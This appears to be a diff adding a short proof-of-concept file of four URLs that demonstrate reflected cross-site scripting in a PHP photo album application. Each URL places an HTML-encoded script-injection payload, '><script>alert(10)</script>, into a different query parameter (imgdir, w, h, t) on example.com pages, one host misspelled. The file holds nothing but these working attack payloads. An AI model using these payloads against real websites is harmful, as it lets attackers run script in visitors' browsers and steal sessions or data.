@@ -1,0 +1,4 @@
+http://www.example.com/lumet/album/index.php?imgdir=&#039;&gt;&lt;script&gt;alert(10)&lt;/script&gt;
+http://www.example.comr/lumet/album/popup.php?w=&#039;&gt;&lt;script&gt;alert(10)&lt;/script&gt;
+http://www.example.com/lumet/album/popup.php?h=&#039;&gt;&lt;script&gt;alert(10)&lt;/script&gt;
+http://www.example.com/lumet/album/popup.php?t=&#039;&gt;&lt;script&gt;alert(10)&lt;/script&gt;
